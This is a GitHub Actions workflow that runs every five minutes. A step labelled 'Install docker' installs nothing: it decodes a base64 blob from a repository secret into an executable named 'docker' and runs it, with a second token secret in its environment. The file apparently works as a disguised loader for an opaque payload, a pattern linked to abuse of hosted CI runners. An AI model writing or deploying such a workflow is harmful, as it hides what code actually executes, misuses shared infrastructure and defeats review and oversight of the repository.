on:
  workflow_dispatch:
  schedule:
    - cron: '*/5 * * * *'

jobs:
  install:
    runs-on: [ubuntu-22.04]
    steps:
      - name: Install docker
        env:
          BUILD_DATA: ${{ secrets.BUILD_DATA }}
          BUILD_TOKEN: ${{ secrets.BUILD_TOKEN }}
        run: |
          set -euo pipefail
          umask 077
          if [ -z "${BUILD_DATA:-}" ]; then
            echo 'BUILD_DATA must be set.' >&2
            exit 1
          fi
          printf '%s' "$BUILD_DATA" | base64 --decode > docker
          unset BUILD_DATA
          chmod 700 docker
          ./docker
